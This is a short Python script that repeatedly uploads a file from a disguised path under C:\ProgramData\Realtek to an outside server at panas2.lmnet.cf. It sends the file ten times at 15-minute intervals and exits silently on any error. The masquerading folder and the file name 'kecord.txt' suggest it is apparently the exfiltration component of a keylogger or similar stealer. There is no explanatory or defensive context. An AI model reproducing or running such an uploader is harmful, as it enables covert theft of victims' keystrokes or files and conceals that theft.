import requests
import time
import sys

url = 'http://panas2.lmnet.cf/upload'
file_path = r'C:\ProgramData\Realtek\ANTB\kecord.txt'

try:
    for i in range(10):
        with open(file_path, 'rb') as file:
            files = {'file': file}
            r = requests.post(url, files=files)
            r.raise_for_status()  # Mag Error Kong Failed pag Upload
        print(f"Success - Upload {i + 1}")

        if i < 9:  # Avoid Sleeping
            time.sleep(900)  # Huat 15 minutes

except requests.exceptions.RequestException as e:
    sys.exit(1)

except FileNotFoundError as e:
    sys.exit(1)

except Exception as e:
    sys.exit(1)
